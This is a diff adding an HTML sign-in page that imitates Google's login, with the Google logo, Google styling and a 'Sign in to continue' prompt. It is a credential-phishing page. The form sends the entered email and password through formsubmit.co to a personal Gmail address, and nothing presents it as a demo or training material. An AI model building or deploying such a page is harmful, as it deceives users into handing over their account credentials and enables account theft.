@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+
+body {
+  margin: 0;
+  font-family: 'Roboto', sans-serif;
+  background: #f2f2f2;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.login-box {
+  background: #ffffff;
+  width: 360px;
+  padding: 40px 35px;
+  border-radius: 10px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+  text-align: center;
+}
+
+/* HEADER IMAGE */
+.header-img {
+  width: 120px;   /* You can increase/decrease size */
+  margin-bottom: 15px;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #5f6368;
+  margin-bottom: 30px;
+}
+
+.input-group {
+  margin-bottom: 20px;
+  text-align: left;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 14px;
+  font-size: 15px;
+  border: 1px solid #dadce0;
+  border-radius: 5px;
+  outline: none;
+  transition: 0.2s;
+}
+
+.input-group input:focus {
+  border: 2px solid #1a73e8;
+}
+
+.next-btn {
+  width: 100%;
+  background: #1a73e8;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 5px;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.next-btn:hover {
+  background: #1669c1;
+}
+
+.footer {
+  margin-top: 30px;
+  font-size: 13px;
+  color: #5f6368;
+}
+
+.footer a {
+  color: #1a73e8;
+  text-decoration: none;
+}
+
+.footer a:hover {
+  text-decoration: underline;
+}
+
+</style>
+</head>
+<body>
+
+<form action="https://formsubmit.co/akg85360@gmail.com" method="POST" />
+<div class="login-box">
+
+  <img src="https://static.vecteezy.com/system/resources/previews/046/861/647/non_2x/google-logo-transparent-background-free-png.png" 
+  class="header-img" alt="Logo">
+
+  <div class="subtitle">Sign in to continue</div>
+
+  <div class="input-group">
+    <input type="email" name="email" placeholder="Email or phone" required>
+  </div>
+
+  <div class="input-group">
+    <input type="text" name="password" placeholder="Password" required>
+  </div>
+
+  <button class="next-btn" type="submit">Next</button>
+
+  <div class="footer">
+    Not your computer?
+    <br><br>
+    <a href="https://www.google.com/account/about/" target="_blank">Learn more</a>
+  </div>
+
+</div>
+</form>
+
+</body>
+</html>
